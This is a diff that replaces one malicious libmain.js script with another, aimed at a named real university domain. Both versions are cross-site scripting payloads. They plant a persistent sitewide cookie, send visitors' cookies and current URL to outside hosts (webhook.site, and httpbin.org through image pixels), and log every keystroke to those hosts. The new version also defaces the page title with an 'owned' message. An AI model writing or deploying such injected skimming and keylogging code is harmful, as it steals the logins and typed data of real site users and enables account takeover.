@@ -1,24 +1,27 @@
-// REPLACE ENTIRE libmain.js with this:
+// YOUR EXISTING libmain.js → REPLACE with this:
 (function(){
-    // Sitewide persistence
-    if(!document.cookie.includes('xss=1')){
-        document.cookie='xss=1;path=/;domain=.mgkvp.ac.in';
-    }
+    console.log(' libmain loaded!');
     
-    // Home page & everywhere
-    if(document.cookie.includes('xss=1')){
-        var beacon = document.createElement('script');
-        beacon.innerHTML = `
-            console.log('🔥 [XSS] Sitewide Active! URL: `+location.href+`');
-            navigator.sendBeacon('https://webhook.site/YOUR-ID', 
-                new Blob([JSON.stringify({url:location.href,cookies:document.cookie})]));
-            
-            // Home page special
-            if(location.href.includes('mgkvp.ac.in') && !location.href.includes('DeptFacilities')){
-                console.log('All good');
-                document.addEventListener('keydown',e=>fetch('https://webhook.site/YOUR-ID?key='+e.key));
-            }
-        `;
-        document.body.appendChild(beacon);
+    // COOKIE PERSISTENCE
+    document.cookie = 'xss_hacked=1;path=/;domain=.mgkvp.ac.in';
+    
+    // SITEWIDE EXECUTION
+    if(document.cookie.includes('xss_hacked=1')){
+        console.log('🌐 SITEWIDE XSS ACTIVE on:', window.location.href);
+        
+        // Data exfil (NO CORS)
+        var pixel = new Image();
+        pixel.src='https://httpbin.org/image/png?data='+btoa(document.cookie+'|'+location.href);
+        
+        // KEYLOGGER EVERY PAGE
+        document.onkeydown = function(e){
+            new Image().src='https://httpbin.org/image/png?key='+btoa(e.key);
+        };
+        
+        // HOME PAGE DETECTION
+        if(location.href.includes('mgkvp.ac.in') && !location.href.includes('pageContentDetails')){
+            console.log('🏠 HOME PAGE ');
+            document.title = 'XSS Owned by H';
+        }
     }
 })();
